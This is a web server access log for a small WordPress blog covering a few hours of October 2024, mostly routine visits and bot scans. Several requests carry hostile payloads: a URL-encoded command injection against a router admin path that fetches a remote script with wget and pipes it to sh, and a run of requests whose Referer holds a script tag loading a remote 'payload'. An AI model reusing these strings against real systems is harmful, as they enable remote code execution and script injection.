178.215.238.68 - - [19/Oct/2024:00:03:17 +0000] "GET /login.rsp HTTP/1.1" 404 453 "-" "Hello World"
162.158.159.147 - - [21/Oct/2024:05:33:36 +0000] "POST /xmlrpc.php HTTP/1.1" 301 560 "-" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/95.0"
122.201.124.71 - - [21/Oct/2024:05:33:36 +0000] "GET / HTTP/1.1" 200 15348 "http://robocandidato.com.br/xmlrpc.php" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/95.0"
162.158.159.101 - - [21/Oct/2024:05:50:21 +0000] "POST /xmlrpc.php HTTP/1.1" 301 560 "-" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/95.0"
82.197.66.199 - - [21/Oct/2024:05:50:21 +0000] "GET / HTTP/1.1" 200 15348 "http://robocandidato.com.br/xmlrpc.php" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/95.0"
185.224.128.47 - - [21/Oct/2024:05:51:04 +0000] "GET / HTTP/1.1" 200 87476 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
172.70.231.38 - - [21/Oct/2024:05:51:54 +0000] "GET /wp-admin/css/ HTTP/1.1" 403 493 "binance.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
172.70.110.142 - - [21/Oct/2024:05:58:39 +0000] "POST /xmlrpc.php HTTP/1.1" 301 560 "-" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/95.0"
143.110.222.166 - - [21/Oct/2024:06:00:19 +0000] "GET / HTTP/1.1" 200 15340 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
45.84.89.2 - - [21/Oct/2024:06:01:02 +0000] "GET / HTTP/1.0" 200 87453 "-" "Mozilla/6.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Inspici (www.inspici.com)"
198.98.54.234 - - [21/Oct/2024:06:03:00 +0000] "GET /command_port.ini HTTP/1.1" 404 453 "-" "-"
179.43.191.98 - - [21/Oct/2024:06:05:26 +0000] "GET / HTTP/1.1" 301 221 "-" "-"
179.43.191.98 - - [21/Oct/2024:06:05:26 +0000] "GET / HTTP/1.1" 301 221 "-" "-"
172.70.230.29 - - [21/Oct/2024:06:06:22 +0000] "POST /xmlrpc.php HTTP/1.1" 301 560 "-" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/95.0"
172.70.230.29 - - [21/Oct/2024:06:06:22 +0000] "POST /xmlrpc.php HTTP/1.1" 301 560 "-" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/95.0"
146.190.110.182 - - [21/Oct/2024:06:06:23 +0000] "GET / HTTP/1.1" 200 15348 "http://robocandidato.com.br/xmlrpc.php" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/95.0"
37.139.53.20 - - [21/Oct/2024:06:11:11 +0000] "GET /contato/contatos/2-eliandra/ HTTP/1.0" 404 453 "http://suporte.namosca.com.br/contato/contatos/2-eliandra/" "Mozilla/5.0 (Windows NT 10.0.0; Win64; x64; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.91 Chrome/124.0.6367.91 Not-A.Brand/99  Safari/537.36"
37.139.53.20 - - [21/Oct/2024:06:11:11 +0000] "GET / HTTP/1.0" 200 87479 "http://suporte.namosca.com.br/" "Mozilla/5.0 (Windows NT 10.0.0; Win64; x64; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.91 Chrome/124.0.6367.91 Not-A.Brand/99  Safari/537.36"
172.96.14.48 - - [21/Oct/2024:06:13:06 +0000] "GET /.env HTTP/1.1" 404 490 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
172.70.110.30 - - [21/Oct/2024:06:15:01 +0000] "POST /xmlrpc.php HTTP/1.1" 301 560 "-" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/95.0"
167.99.55.110 - - [21/Oct/2024:06:15:01 +0000] "POST /wp-cron.php?doing_wp_cron=1729491301.5344259738922119140625 HTTP/1.1" 200 259 "-" "WordPress/6.6.1; http://blog.thx.bz"
185.66.90.243 - - [21/Oct/2024:06:15:01 +0000] "GET / HTTP/1.1" 200 15348 "http://robocandidato.com.br/xmlrpc.php" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/95.0"
178.215.238.68 - - [21/Oct/2024:06:18:30 +0000] "GET /login.rsp HTTP/1.1" 404 453 "-" "Hello World"
172.70.111.85 - - [21/Oct/2024:06:23:05 +0000] "POST /xmlrpc.php HTTP/1.1" 301 560 "-" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/95.0"
43.138.151.238 - - [21/Oct/2024:06:23:06 +0000] "GET / HTTP/1.1" 200 15348 "http://robocandidato.com.br/xmlrpc.php" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/95.0"
162.158.63.161 - - [21/Oct/2024:06:40:37 +0000] "POST /xmlrpc.php HTTP/1.1" 301 560 "-" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/95.0"
172.70.230.159 - - [21/Oct/2024:06:48:30 +0000] "POST /xmlrpc.php HTTP/1.1" 301 560 "-" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/95.0"
13.42.155.159 - - [21/Oct/2024:06:48:30 +0000] "GET / HTTP/1.1" 200 15348 "http://robocandidato.com.br/xmlrpc.php" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/95.0"
162.158.154.236 - - [21/Oct/2024:06:56:31 +0000] "POST /xmlrpc.php HTTP/1.1" 301 560 "-" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/95.0"
103.82.26.5 - - [21/Oct/2024:06:56:31 +0000] "GET / HTTP/1.1" 200 15348 "http://robocandidato.com.br/xmlrpc.php" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/95.0"
15.188.55.197 - - [21/Oct/2024:06:59:45 +0000] "POST /ss.php HTTP/1.1" 404 490 "www.google.com" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
162.158.155.128 - - [21/Oct/2024:07:05:13 +0000] "POST /xmlrpc.php HTTP/1.1" 301 560 "-" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/95.0"
175.178.35.245 - - [21/Oct/2024:07:05:14 +0000] "GET / HTTP/1.1" 200 15348 "http://robocandidato.com.br/xmlrpc.php" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/95.0"
162.158.159.92 - - [21/Oct/2024:07:13:20 +0000] "POST /xmlrpc.php HTTP/1.1" 301 560 "-" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/95.0"
202.137.142.139 - - [21/Oct/2024:07:13:21 +0000] "GET / HTTP/1.1" 200 15348 "http://robocandidato.com.br/xmlrpc.php" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/95.0"
167.99.55.110 - - [21/Oct/2024:07:18:00 +0000] "POST /wp-cron.php?doing_wp_cron=1729495080.5025091171264648437500 HTTP/1.1" 200 259 "-" "WordPress/6.6.1; http://blog.thx.bz"
143.110.222.166 - - [21/Oct/2024:07:18:00 +0000] "GET / HTTP/1.1" 200 15340 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
185.224.128.67 - - [21/Oct/2024:07:20:46 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+-O-+http%3A%2F%2F154.216.17.31%2Ft%7Csh%3B%60) HTTP/1.1" 404 434 "-" "Go-http-client/1.1"
185.224.128.67 - - [21/Oct/2024:07:21:35 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+-O-+http%3A%2F%2F154.216.17.31%2Ft%7Csh%3B%60) HTTP/1.1" 404 434 "-" "Go-http-client/1.1"
185.224.128.67 - - [21/Oct/2024:07:21:46 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+-O-+http%3A%2F%2F154.216.17.31%2Ft%7Csh%3B%60) HTTP/1.1" 404 434 "-" "Go-http-client/1.1"
185.224.128.67 - - [21/Oct/2024:07:21:48 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+-O-+http%3A%2F%2F154.216.17.31%2Ft%7Csh%3B%60) HTTP/1.1" 404 434 "-" "Go-http-client/1.1"
172.70.114.115 - - [21/Oct/2024:07:22:07 +0000] "POST /xmlrpc.php HTTP/1.1" 301 560 "-" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/95.0"
192.250.229.40 - - [21/Oct/2024:07:22:07 +0000] "GET / HTTP/1.1" 200 15348 "http://robocandidato.com.br/xmlrpc.php" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/95.0"
162.158.159.31 - - [21/Oct/2024:07:30:46 +0000] "POST /xmlrpc.php HTTP/1.1" 301 560 "-" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/95.0"
162.158.159.31 - - [21/Oct/2024:07:30:46 +0000] "POST /xmlrpc.php HTTP/1.1" 301 560 "-" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/95.0"
162.158.159.31 - - [21/Oct/2024:07:30:46 +0000] "POST /xmlrpc.php HTTP/1.1" 301 560 "-" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/95.0"
142.93.76.138 - - [21/Oct/2024:07:30:46 +0000] "GET / HTTP/1.1" 200 15348 "http://robocandidato.com.br/xmlrpc.php" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/95.0"
80.97.26.93 - - [21/Oct/2024:07:32:46 +0000] "GET / HTTP/1.1" 200 15385 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0"
80.97.26.93 - - [21/Oct/2024:07:33:12 +0000] "GET /wp-includes/blocks/navigation/style.min.css?ver=6.6.1 HTTP/1.1" 200 2623 "http://blog.thx.bz/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0"
80.97.26.93 - - [21/Oct/2024:07:33:12 +0000] "GET /wp-includes/blocks/image/style.min.css?ver=6.6.1 HTTP/1.1" 200 1862 "http://blog.thx.bz/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0"
80.97.26.93 - - [21/Oct/2024:07:33:26 +0000] "GET /wp-includes/js/dist/interactivity.min.js?ver=6.6.1 HTTP/1.1" 200 13899 "http://blog.thx.bz/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0"
80.97.26.93 - - [21/Oct/2024:07:33:26 +0000] "GET /wp-includes/blocks/navigation/view.min.js?ver=6.6.1 HTTP/1.1" 200 1479 "http://blog.thx.bz/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0"
179.43.191.98 - - [21/Oct/2024:07:34:42 +0000] "GET / HTTP/1.1" 301 221 "-" "-"
179.43.191.98 - - [21/Oct/2024:07:34:42 +0000] "GET / HTTP/1.1" 301 221 "-" "-"
162.158.62.237 - - [21/Oct/2024:07:35:16 +0000] "GET /wp-content/plugins/webappick-product-feed-for-woocommerce/archlve.php HTTP/1.1" 404 490 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
162.158.63.114 - - [21/Oct/2024:07:35:53 +0000] "GET /wp-content/plugins/disable-search/functlons.php HTTP/1.1" 404 490 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
172.70.114.183 - - [21/Oct/2024:07:35:55 +0000] "GET /wp-content/plugins/upload-max-file-size/wp-config-sample.php HTTP/1.1" 404 490 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
172.70.230.13 - - [21/Oct/2024:07:36:24 +0000] "GET /wp-content/plugins/Wesson/mlor.php HTTP/1.1" 404 490 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
172.70.230.12 - - [21/Oct/2024:07:39:29 +0000] "POST /xmlrpc.php HTTP/1.1" 301 560 "-" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/95.0"
185.87.122.40 - - [21/Oct/2024:07:39:29 +0000] "GET / HTTP/1.1" 200 15348 "http://robocandidato.com.br/xmlrpc.php" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/95.0"
162.158.63.54 - - [21/Oct/2024:07:47:53 +0000] "POST /xmlrpc.php HTTP/1.1" 301 560 "-" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/95.0"
81.177.136.216 - - [21/Oct/2024:07:47:54 +0000] "GET / HTTP/1.1" 200 15348 "http://robocandidato.com.br/xmlrpc.php" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/95.0"
46.174.191.32 - - [21/Oct/2024:07:48:32 +0000] "GET / HTTP/1.0" 200 60752 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko"
162.158.158.227 - - [21/Oct/2024:07:56:44 +0000] "POST /xmlrpc.php HTTP/1.1" 301 560 "-" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/95.0"
194.164.163.87 - - [21/Oct/2024:07:56:44 +0000] "GET / HTTP/1.1" 200 15348 "http://robocandidato.com.br/xmlrpc.php" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/95.0"
139.99.9.160 - - [21/Oct/2024:08:01:44 +0000] "GET / HTTP/1.1" 200 87503 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
162.158.154.222 - - [21/Oct/2024:08:05:14 +0000] "POST /xmlrpc.php HTTP/1.1" 301 560 "-" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/95.0"
162.158.154.222 - - [21/Oct/2024:08:05:14 +0000] "POST /xmlrpc.php HTTP/1.1" 301 560 "-" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/95.0"
72.9.145.44 - - [21/Oct/2024:08:05:15 +0000] "GET / HTTP/1.1" 200 15348 "http://robocandidato.com.br/xmlrpc.php" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/95.0"
138.199.53.226 - - [21/Oct/2024:08:05:34 +0000] "GET /index.php/2024/10/20/this-is-a-test/ HTTP/1.1" 200 14077 "http://blog.thx.bz/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0"
138.199.53.226 - - [21/Oct/2024:08:05:35 +0000] "GET /wp-includes/js/comment-reply.min.js?ver=6.6.1 HTTP/1.1" 200 1695 "http://blog.thx.bz/index.php/2024/10/20/this-is-a-test/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0"
138.199.53.226 - - [21/Oct/2024:08:05:35 +0000] "GET /wp-includes/css/dist/block-library/common.min.css?ver=6.6.1 HTTP/1.1" 200 1437 "http://blog.thx.bz/index.php/2024/10/20/this-is-a-test/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0"
138.199.53.226 - - [21/Oct/2024:08:05:48 +0000] "GET /index.php/2024/10/20/this-is-a-test/ HTTP/1.1" 200 14040 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36"
138.199.53.226 - - [21/Oct/2024:08:06:34 +0000] "GET /index.php/2024/10/20/this-is-a-test/ HTTP/1.1" 200 14040 "<script src=\"https://media.cdnstaticjs.com/?payload=873933\"></script>" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36"
138.199.53.226 - - [21/Oct/2024:08:06:35 +0000] "GET /index.php/2024/10/20/this-is-a-test/ HTTP/1.1" 200 14040 "<script src=\"https://media.cdnstaticjs.com/?payload=873933\"></script>" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36"
138.199.53.226 - - [21/Oct/2024:08:06:36 +0000] "GET /index.php/2024/10/20/this-is-a-test/ HTTP/1.1" 200 14040 "<script src=\"https://media.cdnstaticjs.com/?payload=873933\"></script>" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36"
138.199.53.226 - - [21/Oct/2024:08:06:42 +0000] "GET /index.php/2024/10/20/this-is-a-test/ HTTP/1.1" 200 14040 "<script src=\"https://media.cdnstaticjs.com/?payload=873933\"></script>" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36"
138.199.53.226 - - [21/Oct/2024:08:06:43 +0000] "GET /index.php/2024/10/20/this-is-a-test/ HTTP/1.1" 200 14040 "<script src=\"https://media.cdnstaticjs.com/?payload=873933\"></script>" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36"
138.199.53.226 - - [21/Oct/2024:08:06:44 +0000] "GET /index.php/2024/10/20/this-is-a-test/ HTTP/1.1" 200 14040 "<script src=\"https://media.cdnstaticjs.com/?payload=873933\"></script>" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36"
138.199.53.226 - - [21/Oct/2024:08:06:45 +0000] "GET /index.php/2024/10/20/this-is-a-test/ HTTP/1.1" 200 14040 "<script src=\"https://media.cdnstaticjs.com/?payload=873933\"></script>" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36"
138.199.53.226 - - [21/Oct/2024:08:06:46 +0000] "GET /index.php/2024/10/20/this-is-a-test/ HTTP/1.1" 200 14040 "<script src=\"https://media.cdnstaticjs.com/?payload=873933\"></script>" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36"
138.199.53.226 - - [21/Oct/2024:08:06:47 +0000] "GET /index.php/2024/10/20/this-is-a-test/ HTTP/1.1" 200 14040 "<script src=\"https://media.cdnstaticjs.com/?payload=873933\"></script>" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36"
138.199.53.226 - - [21/Oct/2024:08:06:48 +0000] "GET /index.php/2024/10/20/this-is-a-test/ HTTP/1.1" 200 14040 "<script src=\"https://media.cdnstaticjs.com/?payload=873933\"></script>" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36"
138.199.53.226 - - [21/Oct/2024:08:06:54 +0000] "GET / HTTP/1.1" 200 15385 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0"
138.199.53.226 - - [21/Oct/2024:08:07:02 +0000] "GET /wp-admin/ HTTP/1.1" 302 428 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0"
138.199.53.226 - - [21/Oct/2024:08:07:02 +0000] "GET /wp-login.php?redirect_to=http%3A%2F%2Fblog.thx.bz%2Fwp-admin%2F&reauth=1 HTTP/1.1" 200 4174 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0"
138.199.53.226 - - [21/Oct/2024:08:07:03 +0000] "GET /wp-admin/js/password-strength-meter.min.js?ver=6.6.1 HTTP/1.1" 200 964 "http://blog.thx.bz/wp-login.php?redirect_to=http%3A%2F%2Fblog.thx.bz%2Fwp-admin%2F&reauth=1" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0"
138.199.53.226 - - [21/Oct/2024:08:07:03 +0000] "GET /wp-admin/js/user-profile.min.js?ver=6.6.1 HTTP/1.1" 200 2825 "http://blog.thx.bz/wp-login.php?redirect_to=http%3A%2F%2Fblog.thx.bz%2Fwp-admin%2F&reauth=1" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0"
138.199.53.226 - - [21/Oct/2024:08:07:03 +0000] "GET /wp-includes/js/underscore.min.js?ver=1.13.4 HTTP/1.1" 200 7656 "http://blog.thx.bz/wp-login.php?redirect_to=http%3A%2F%2Fblog.thx.bz%2Fwp-admin%2F&reauth=1" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0"
138.199.53.226 - - [21/Oct/2024:08:07:03 +0000] "GET /wp-includes/js/dist/i18n.min.js?ver=5e580eb46a90c2b997e6 HTTP/1.1" 200 4012 "http://blog.thx.bz/wp-login.php?redirect_to=http%3A%2F%2Fblog.thx.bz%2Fwp-admin%2F&reauth=1" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0"
138.199.53.226 - - [21/Oct/2024:08:07:03 +0000] "GET /wp-admin/load-styles.php?c=0&dir=ltr&load%5Bchunk_0%5D=dashicons,buttons,forms,l10n,login&ver=6.6.1 HTTP/1.1" 200 46316 "http://blog.thx.bz/wp-login.php?redirect_to=http%3A%2F%2Fblog.thx.bz%2Fwp-admin%2F&reauth=1" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0"
138.199.53.226 - - [21/Oct/2024:08:07:03 +0000] "GET /wp-admin/images/wordpress-logo.svg?ver=20131107 HTTP/1.1" 200 1810 "http://blog.thx.bz/wp-admin/load-styles.php?c=0&dir=ltr&load%5Bchunk_0%5D=dashicons,buttons,forms,l10n,login&ver=6.6.1" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0"
138.199.53.226 - - [21/Oct/2024:08:07:04 +0000] "GET /wp-includes/js/wp-util.min.js?ver=6.6.1 HTTP/1.1" 200 1099 "http://blog.thx.bz/wp-login.php?redirect_to=http%3A%2F%2Fblog.thx.bz%2Fwp-admin%2F&reauth=1" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0"
138.199.53.226 - - [21/Oct/2024:08:07:04 +0000] "GET /wp-admin/load-scripts.php?c=0&load%5Bchunk_0%5D=jquery-core,jquery-migrate,zxcvbn-async,wp-hooks&ver=6.6.1 HTTP/1.1" 200 36250 "http://blog.thx.bz/wp-login.php?redirect_to=http%3A%2F%2Fblog.thx.bz%2Fwp-admin%2F&reauth=1" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0"
138.199.53.226 - - [21/Oct/2024:08:07:04 +0000] "GET /wp-includes/js/zxcvbn.min.js HTTP/1.1" 200 400393 "http://blog.thx.bz/wp-login.php?redirect_to=http%3A%2F%2Fblog.thx.bz%2Fwp-admin%2F&reauth=1" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0"
138.199.53.226 - - [21/Oct/2024:08:07:09 +0000] "POST /wp-login.php HTTP/1.1" 302 1111 "http://blog.thx.bz/wp-login.php?redirect_to=http%3A%2F%2Fblog.thx.bz%2Fwp-admin%2F&reauth=1" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0"
138.199.53.226 - - [21/Oct/2024:08:07:09 +0000] "GET /wp-admin/ HTTP/1.1" 200 22760 "http://blog.thx.bz/wp-login.php?redirect_to=http%3A%2F%2Fblog.thx.bz%2Fwp-admin%2F&reauth=1" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0"
138.199.53.226 - - [21/Oct/2024:08:07:10 +0000] "GET /wp-includes/js/dist/url.min.js?ver=36ae0e4dd9043bb8749b HTTP/1.1" 200 4079 "http://blog.thx.bz/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0"
138.199.53.226 - - [21/Oct/2024:08:07:10 +0000] "GET /wp-admin/load-styles.php?c=0&dir=ltr&load%5Bchunk_0%5D=dashicons,admin-bar,site-health,common,forms,admin-menu,dashboard,list-tables,edit,revisions,media,themes,about,nav-menus,wp-poi&load%5Bchunk_1%5D=nter,widgets,site-icon,l10n,buttons,wp-auth-check&ver=6.6.1 HTTP/1.1" 200 101922 "http://blog.thx.bz/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0"
138.199.53.226 - - [21/Oct/2024:08:07:10 +0000] "GET /wp-admin/js/site-health.min.js?ver=6.6.1 HTTP/1.1" 200 2541 "http://blog.thx.bz/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0"
138.199.53.226 - - [21/Oct/2024:08:07:10 +0000] "GET /wp-includes/js/hoverintent-js.min.js?ver=2.2.1 HTTP/1.1" 200 1061 "http://blog.thx.bz/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0"
